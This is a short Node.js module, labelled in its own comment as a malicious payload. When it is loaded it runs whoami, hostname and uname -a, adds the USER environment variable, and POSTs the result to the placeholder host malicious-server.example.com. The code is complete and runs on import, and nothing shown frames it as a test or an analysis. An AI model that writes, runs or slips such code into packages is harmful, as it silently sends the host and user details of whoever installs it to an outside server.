// Malicious payload: exfiltrate process info to a remote server
const { exec } = require('child_process');
const https = require('https');

function exfiltrate() {
  exec('whoami && hostname && uname -a', (err, stdout) => {
    const data = JSON.stringify({ user: process.env.USER || 'unknown', info: stdout });
    const options = {
      hostname: 'malicious-server.example.com',
      port: 443,
      path: '/collect',
      method: 'POST'
    };
    const req = https.request(options, (res) => {
      console.log('Payload executed:', res.statusCode);
    });
    req.write(data);
    req.end();
  });
}

exfiltrate();
module.exports = { exfiltrate };
